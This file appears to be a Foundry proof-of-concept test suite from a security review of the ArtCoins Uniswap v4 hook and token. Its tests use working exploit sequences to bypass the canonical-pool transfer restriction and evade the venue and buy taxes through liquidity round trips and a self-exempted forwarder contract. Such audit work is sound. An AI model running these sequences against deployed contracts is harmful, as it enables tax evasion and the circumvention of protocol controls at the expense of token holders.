// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

// independent review v2-a, proof tests. each test PASSES by demonstrating the
// bug. v4 is deployed from the pinned lib/v4-core source (no rpc needed), the
// hook is the real ArtCoinsHookV2 at a mined address, the coin is the real
// ArtCoinsTokenV2. see docs/v2/review/v2-review-a.md.
//
// forge keeps transient storage across setUp and the test unless calls are
// isolated, so the stack suites run with inline `isolate = true`: every top
// level call is its own tx, exactly like separate mainnet txs. every test
// asserts `pendingCanonical() == 0` first.

import {Test} from "forge-std/Test.sol";

import {Constants} from "../../../../src/Constants.sol";
import {ArtCoinsFeeEscrowV2} from "../../../../src/v2/ArtCoinsFeeEscrowV2.sol";
import {ArtCoinsTokenV2} from "../../../../src/v2/ArtCoinsTokenV2.sol";
import {ArtCoinsHookV2} from "../../../../src/v2/hooks/ArtCoinsHookV2.sol";
import {IArtCoinsFactoryV2} from "../../../../src/v2/interfaces/IArtCoinsFactoryV2.sol";
import {IArtCoinsHookV2} from "../../../../src/v2/interfaces/IArtCoinsHookV2.sol";
import {IArtCoinsTokenV2} from "../../../../src/v2/interfaces/IArtCoinsTokenV2.sol";

import {PoolManager} from "@uniswap/v4-core/src/PoolManager.sol";
import {IHooks} from "@uniswap/v4-core/src/interfaces/IHooks.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {IUnlockCallback} from "@uniswap/v4-core/src/interfaces/callback/IUnlockCallback.sol";
import {Hooks} from "@uniswap/v4-core/src/libraries/Hooks.sol";
import {StateLibrary} from "@uniswap/v4-core/src/libraries/StateLibrary.sol";
import {TickMath} from "@uniswap/v4-core/src/libraries/TickMath.sol";
import {TransientStateLibrary} from "@uniswap/v4-core/src/libraries/TransientStateLibrary.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {PoolId, PoolIdLibrary} from "@uniswap/v4-core/src/types/PoolId.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {HookMiner} from "@uniswap/v4-periphery/src/utils/HookMiner.sol";

interface IV2AErc20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

/// locker stand in for `initializePool` (only `constantsHash` is read).
contract V2AConstantsStub {
    function constantsHash() external pure returns (bytes32) {
        return Constants.hash();
    }
}

/// raw PoolManager actor: runs a list of swaps / liquidity ops in one unlock,
/// then settles every debt (coin via sync, erc20 transfer, settle) and takes
/// every credit to itself.
contract V2AActor is IUnlockCallback {
    using TransientStateLibrary for IPoolManager;

    uint8 internal constant SWAP = 1;
    uint8 internal constant MODIFY = 2;
    uint8 internal constant TAKE_COIN = 3; // take the current positive coin delta now

    struct Op {
        uint8 kind;
        PoolKey key;
        bool zeroForOne;
        int256 amount; // swap: amountSpecified; modify: liquidityDelta
        int24 lo;
        int24 hi;
        bytes32 salt;
    }

    IPoolManager public immutable pm;
    address public immutable coin;

    constructor(IPoolManager pm_, address coin_) {
        pm = pm_;
        coin = coin_;
    }

    receive() external payable {}

    function run(Op[] memory ops) external {
        pm.unlock(abi.encode(ops));
    }

    function unlockCallback(bytes calldata data) external returns (bytes memory) {
        require(msg.sender == address(pm), "pm");
        Op[] memory ops = abi.decode(data, (Op[]));
        for (uint256 i; i < ops.length; ++i) {
            Op memory o = ops[i];
            if (o.kind == SWAP) {
                pm.swap(
                    o.key,
                    IPoolManager.SwapParams({
                        zeroForOne: o.zeroForOne,
                        amountSpecified: o.amount,
                        sqrtPriceLimitX96: o.zeroForOne
                            ? TickMath.MIN_SQRT_PRICE + 1
                            : TickMath.MAX_SQRT_PRICE - 1
                    }),
                    ""
                );
            } else if (o.kind == TAKE_COIN) {
                int256 d = pm.currencyDelta(address(this), Currency.wrap(coin));
                if (d > 0) pm.take(Currency.wrap(coin), address(this), uint256(d));
            } else {
                pm.modifyLiquidity(
                    o.key,
                    IPoolManager.ModifyLiquidityParams({
                        tickLower: o.lo, tickUpper: o.hi, liquidityDelta: o.amount, salt: o.salt
                    }),
                    ""
                );
            }
        }
        _resolve(Currency.wrap(address(0)));
        _resolve(Currency.wrap(coin));
        return "";
    }

    function _resolve(Currency c) internal {
        int256 d = pm.currencyDelta(address(this), c);
        if (d < 0) {
            uint256 owe = uint256(-d);
            if (c.isAddressZero()) {
                pm.settle{value: owe}();
            } else {
                pm.sync(c);
                IV2AErc20(coin).transfer(address(pm), owe);
                pm.settle();
            }
        } else if (d > 0) {
            pm.take(c, address(this), uint256(d));
        }
    }
}

abstract contract V2AStackBase is Test {
    using PoolIdLibrary for PoolKey;
    using StateLibrary for IPoolManager;

    uint160 internal constant HOOK_FLAGS = uint160(
        Hooks.BEFORE_INITIALIZE_FLAG | Hooks.BEFORE_ADD_LIQUIDITY_FLAG
            | Hooks.AFTER_ADD_LIQUIDITY_FLAG | Hooks.AFTER_REMOVE_LIQUIDITY_FLAG
            | Hooks.BEFORE_SWAP_FLAG | Hooks.AFTER_SWAP_FLAG | Hooks.BEFORE_SWAP_RETURNS_DELTA_FLAG
            | Hooks.AFTER_SWAP_RETURNS_DELTA_FLAG
    );
    int24 internal constant TS = 60;
    int24 internal constant LO = -887_220;
    int24 internal constant HI = 887_220;
    int256 internal constant L_LAUNCH = 1e23; // about 1e5 eth and 1e5 coin at price 1
    int256 internal constant L_SIDE = 1e21; // about 1e3 eth and 1e3 coin
    int256 internal constant L_PARKED = 1e22; // attacker's canonical position, about 1e4 coin
    bytes32 internal constant PARKED_SALT = bytes32(uint256(7));

    IPoolManager internal pm;
    ArtCoinsFeeEscrowV2 internal escrow;
    ArtCoinsHookV2 internal hook;
    ArtCoinsTokenV2 internal coin;
    PoolKey internal canon;
    PoolKey internal side;
    V2AActor internal lp;
    V2AActor internal attacker;
    address internal bounty = makeAddr("bounty");

    function _stack(uint8 mode) internal {
        pm = IPoolManager(address(new PoolManager(address(this))));
        escrow = new ArtCoinsFeeEscrowV2(address(this));
        bytes memory args = abi.encode(address(pm), address(this), address(escrow), address(0));
        (address at, bytes32 salt) =
            HookMiner.find(address(this), HOOK_FLAGS, type(ArtCoinsHookV2).creationCode, args);
        hook = new ArtCoinsHookV2{salt: salt}(pm, address(this), address(escrow), address(0));
        require(address(hook) == at, "miner");
        escrow.addDepositor(address(hook), true);
        hook.setLauncher(address(this), true);

        IArtCoinsFactoryV2.TokenConfigV2 memory t;
        t.tokenAdmin = address(this);
        t.name = "Review A";
        t.symbol = "RVA";
        IArtCoinsFactoryV2.TaxConfigV2 memory tax;
        tax.mode = mode;
        if (mode == Constants.TAX_MODE_VENUE) {
            tax.taxBps = 1500;
            tax.taxBpsMax = 2000;
            tax.taxSink = Constants.DEAD;
        }
        coin = new ArtCoinsTokenV2(
            t,
            1e27,
            tax,
            ArtCoinsTokenV2.CanonicalPool({
                hook: address(hook), poolManager: address(pm), tickSpacing: TS, bountyRecipient: bounty
            }),
            address(this)
        );

        IArtCoinsHookV2.PoolInitParams memory p;
        p.token = address(coin);
        p.tickSpacing = TS;
        p.locker = address(new V2AConstantsStub());
        p.skim = IArtCoinsHookV2.SkimConfig({
            baselineSkimBps: 0,
            bountyBps: 0,
            maxReferralBpsOfVolume: 0,
            lpFee: 3000,
            bountyRecipient: payable(bounty),
            protocolRecipient: payable(makeAddr("protocol")),
            referralPayout: payable(address(escrow)),
            quoteToken: address(0)
        });
        canon = hook.initializePool(p);
        hook.initializeMevModule(canon, "");

        // an unhooked side pool for the same coin on the same PoolManager
        side = PoolKey({
            currency0: Currency.wrap(address(0)),
            currency1: Currency.wrap(address(coin)),
            fee: 3000,
            tickSpacing: TS,
            hooks: IHooks(address(0))
        });
        pm.initialize(side, TickMath.getSqrtPriceAtTick(0));

        lp = new V2AActor(pm, address(coin));
        attacker = new V2AActor(pm, address(coin));
        vm.deal(address(lp), 10_000_000 ether);
        vm.deal(address(attacker), 1_000_000 ether);
        coin.transfer(address(lp), 400_000e18);
        coin.transfer(address(attacker), 100_000e18);

        // launch liquidity on the canonical pool (HARD: covered by the hook's add grant)
        _run(lp, _one(_modify(canon, L_LAUNCH, bytes32(0))));
    }

    // ── op builders ───────────────────────────────────────────────────────

    function _swap(PoolKey memory k, bool zeroForOne, int256 amt)
        internal
        pure
        returns (V2AActor.Op memory o)
    {
        o.kind = 1;
        o.key = k;
        o.zeroForOne = zeroForOne;
        o.amount = amt;
    }

    function _modify(PoolKey memory k, int256 liq, bytes32 salt)
        internal
        pure
        returns (V2AActor.Op memory o)
    {
        o.kind = 2;
        o.key = k;
        o.amount = liq;
        o.lo = LO;
        o.hi = HI;
        o.salt = salt;
    }

    function _takeCoin() internal pure returns (V2AActor.Op memory o) {
        o.kind = 3;
    }

    function _four(
        V2AActor.Op memory a,
        V2AActor.Op memory b,
        V2AActor.Op memory c,
        V2AActor.Op memory d
    ) internal pure returns (V2AActor.Op[] memory ops) {
        ops = new V2AActor.Op[](4);
        ops[0] = a;
        ops[1] = b;
        ops[2] = c;
        ops[3] = d;
    }

    function _one(V2AActor.Op memory a) internal pure returns (V2AActor.Op[] memory ops) {
        ops = new V2AActor.Op[](1);
        ops[0] = a;
    }

    function _two(V2AActor.Op memory a, V2AActor.Op memory b)
        internal
        pure
        returns (V2AActor.Op[] memory ops)
    {
        ops = new V2AActor.Op[](2);
        ops[0] = a;
        ops[1] = b;
    }

    function _three(V2AActor.Op memory a, V2AActor.Op memory b, V2AActor.Op memory c)
        internal
        pure
        returns (V2AActor.Op[] memory ops)
    {
        ops = new V2AActor.Op[](3);
        ops[0] = a;
        ops[1] = b;
        ops[2] = c;
    }

    function _run(V2AActor who, V2AActor.Op[] memory ops) internal {
        who.run(ops);
    }

    /// parks the attacker's canonical position in its own tx (isolated call).
    /// done inside the test: forge isolates test calls but not setUp, so a
    /// position added in setUp would keep its b1 marker into the test.
    function _park() internal {
        _run(attacker, _one(_modify(canon, L_PARKED, PARKED_SALT)));
        assertEq(_parkedLiquidity(), uint128(uint256(L_PARKED)));
    }

    /// WrappedError(address,bytes4,bytes reason,bytes) -> bytes4(reason)
    function _innerSelector(bytes memory err) internal pure returns (bytes4 sel) {
        require(err.length >= 4 + 128, "short");
        bytes memory body = new bytes(err.length - 4);
        for (uint256 i; i < body.length; ++i) {
            body[i] = err[i + 4];
        }
        (, , bytes memory reason,) = abi.decode(body, (address, bytes4, bytes, bytes));
        sel = bytes4(reason);
    }

    function _assertNoPending() internal view {
        (uint256 b, uint256 o, uint256 i) = coin.pendingCanonical();
        assertEq(b + o + i, 0, "transient state leaked into the test");
    }

    function _parkedLiquidity() internal view returns (uint128 liq) {
        (liq,,) = pm.getPositionInfo(canon.toId(), address(attacker), LO, HI, PARKED_SALT);
    }
}

/// V2A-01, HARD mode. the "canonical only" wall is bypassed with canonical
/// liquidity round trips that never trade on the canonical pool.
/// forge-config: default.isolate = true
contract V2A01HardTest is V2AStackBase {
    function setUp() public {
        _stack(Constants.TAX_MODE_HARD);
        // side pool liquidity, funded legitimately: a canonical buy whose coin
        // seeds the side pool inside the PoolManager (D24 residual), rest taken
        // under the buy's out grant.
        _run(lp, _two(_swap(canon, true, -2000 ether), _modify(side, L_SIDE, bytes32(0))));
    }

    /// add then remove on the canonical pool mints an IN grant for free (the
    /// b1 marker only suppresses the remove side). the grant lets erc20 coin
    /// enter the PoolManager for a side pool sell, which HARD must block.
    function test_V2A01_hard_addThenRemove_mintsFreeInGrant_sidePoolSellSettles() public {
        _assertNoPending();
        uint256 sellAmt = 100e18;

        // baseline: a plain side pool sell cannot settle its coin
        vm.expectRevert(
            abi.encodeWithSelector(
                IArtCoinsTokenV2.CanonicalFlowRequired.selector,
                address(attacker),
                address(pm),
                sellAmt
            )
        );
        _run(attacker, _one(_swap(side, false, -int256(sellAmt))));

        // exploit: same sell, prefixed by a zero capital add+remove of 1e22 on the canonical pool
        uint256 eth0 = address(attacker).balance;
        uint256 coin0 = coin.balanceOf(address(attacker));
        _run(
            attacker,
            _three(
                _modify(canon, 1e22, bytes32(uint256(99))),
                _modify(canon, -1e22, bytes32(uint256(99))),
                _swap(side, false, -int256(sellAmt))
            )
        );
        uint256 ethOut = address(attacker).balance - eth0;
        uint256 coinIn = coin0 - coin.balanceOf(address(attacker));

        assertGt(ethOut, 80 ether, "side pool sell paid out eth");
        assertGe(coinIn, sellAmt, "erc20 coin entered the PoolManager");
        assertLe(coinIn, sellAmt + 2, "only rounding dust beyond the sell");
        emit log_named_uint("eth received from side pool sell", ethOut);
        emit log_named_uint("erc20 coin settled into the PoolManager", coinIn);
    }

    /// remove then re add a position that existed before the tx mints an OUT
    /// grant (and an IN grant) with no net canonical flow. the out grant lets
    /// coin bought on a side pool leave the PoolManager as erc20.
    function test_V2A01_hard_removeThenReadd_mintsOutGrant_sidePoolBuyTakes() public {
        _assertNoPending();
        _park();

        // baseline: a plain side pool buy cannot take its coin (the PoolManager
        // wraps the token's CanonicalFlowRequired in WrappedError)
        try attacker.run(_one(_swap(side, true, -10 ether))) {
            fail("side pool take should revert");
        } catch (bytes memory err) {
            assertEq(_innerSelector(err), IArtCoinsTokenV2.CanonicalFlowRequired.selector);
        }

        uint256 coin0 = coin.balanceOf(address(attacker));
        uint256 eth0 = address(attacker).balance;
        _run(
            attacker,
            _four(
                _modify(canon, -L_PARKED, PARKED_SALT),
                _swap(side, true, -10 ether),
                _takeCoin(), // consume the grant before the re add can net it (D34)
                _modify(canon, L_PARKED, PARKED_SALT)
            )
        );
        uint256 coinOut = coin.balanceOf(address(attacker)) - coin0;
        uint256 ethIn = eth0 - address(attacker).balance;

        assertGt(coinOut, 9e18, "side pool coin left the PoolManager as erc20");
        assertLe(ethIn, 10 ether + 2, "paid only the side pool input plus dust");
        assertEq(_parkedLiquidity(), uint128(uint256(L_PARKED)), "canonical position restored");
        emit log_named_uint("erc20 coin bought on side pool and taken", coinOut);
    }
}

/// V2A-01, VENUE mode. remove then re add of a parked canonical position
/// attests budget with no net canonical flow; a side pool buy goes untaxed.
/// forge-config: default.isolate = true
contract V2A01VenueTest is V2AStackBase {
    function setUp() public {
        _stack(Constants.TAX_MODE_VENUE);
        _run(lp, _one(_modify(side, L_SIDE, bytes32(0)))); // inflow, untaxed
    }

    function test_V2A01_venue_removeThenReadd_sidePoolBuyUntaxed() public {
        _assertNoPending();
        _park();
        address dead = Constants.DEAD;

        // baseline: side pool buy pays 15%
        uint256 dead0 = coin.balanceOf(dead);
        uint256 c0 = coin.balanceOf(address(attacker));
        _run(attacker, _one(_swap(side, true, -10 ether)));
        uint256 taxed = coin.balanceOf(address(attacker)) - c0;
        uint256 tax = coin.balanceOf(dead) - dead0;
        assertGt(tax, 1e18, "baseline side buy is taxed");
        assertApproxEqRel(tax * 10_000 / (taxed + tax), 1500, 1e15, "15% of gross");

        // exploit: same buy wrapped in remove then re add of the parked position
        dead0 = coin.balanceOf(dead);
        c0 = coin.balanceOf(address(attacker));
        _run(
            attacker,
            _four(
                _modify(canon, -L_PARKED, PARKED_SALT),
                _swap(side, true, -10 ether),
                _takeCoin(), // consume the grant before the re add can net it (D34)
                _modify(canon, L_PARKED, PARKED_SALT)
            )
        );
        uint256 untaxed = coin.balanceOf(address(attacker)) - c0;
        assertEq(coin.balanceOf(dead), dead0, "no tax paid");
        assertGt(untaxed, taxed, "received the gross side pool output");
        assertEq(_parkedLiquidity(), uint128(uint256(L_PARKED)), "canonical position restored");
        emit log_named_uint("baseline net (taxed)", taxed);
        emit log_named_uint("exploit net (untaxed)", untaxed);
    }
}

/// a 10 line contract the deployer controls. it qualifies as an exempt entry
/// because it has code (FT-07 residual).
contract V2AForwarder {
    address internal immutable owner;

    constructor(address owner_) {
        owner = owner_;
    }

    function forward(address token) external {
        IV2AErc20(token).transfer(owner, IV2AErc20(token).balanceOf(address(this)));
    }
}

/// v2/v3 style venue stand in: reports the coin as token1 and pays out like a swap.
contract V2AVenue {
    address public immutable token0 = address(0x1);
    address public immutable token1;

    constructor(address coin_) {
        token1 = coin_;
    }

    function swapOut(address to, uint256 amount) external {
        IV2AErc20(token1).transfer(to, amount);
    }
}

/// V2A-02: FT-07 is not fixed. the exempt set accepts any contract, so a
/// deployer exempts its own forwarder and buys from any venue untaxed.
contract V2A02ExemptTest is Test {
    function test_V2A02_venue_deployerForwarderExempt_buysUntaxed() public {
        address dev = makeAddr("dev");
        V2AForwarder fwd = new V2AForwarder(dev); // deployed before launch

        IArtCoinsFactoryV2.TokenConfigV2 memory t;
        t.tokenAdmin = address(this);
        t.name = "Exempt";
        t.symbol = "EX";
        IArtCoinsFactoryV2.TaxConfigV2 memory tax;
        tax.mode = Constants.TAX_MODE_VENUE;
        tax.taxBps = 2000;
        tax.taxBpsMax = 2000;
        tax.taxSink = Constants.DEAD;
        tax.exempt = new address[](1);
        tax.exempt[0] = address(fwd);
        ArtCoinsTokenV2 coin = new ArtCoinsTokenV2(
            t,
            1e27,
            tax,
            ArtCoinsTokenV2.CanonicalPool({
                hook: makeAddr("hook"),
                poolManager: makeAddr("pm"),
                tickSpacing: 60,
                bountyRecipient: makeAddr("bounty")
            }),
            address(this)
        );
        assertTrue(coin.isTaxExempt(address(fwd)));

        V2AVenue venue = new V2AVenue(address(coin));
        coin.addTaxVenue(address(venue));
        coin.transfer(address(venue), 1000e18);

        // a normal buyer pays 20%
        address buyer = makeAddr("buyer");
        venue.swapOut(buyer, 100e18);
        assertEq(coin.balanceOf(buyer), 80e18);

        // the deployer routes the same buy through its exempt forwarder
        venue.swapOut(address(fwd), 100e18);
        fwd.forward(address(coin));
        assertEq(coin.balanceOf(dev), 100e18, "deployer bought untaxed");
    }
}
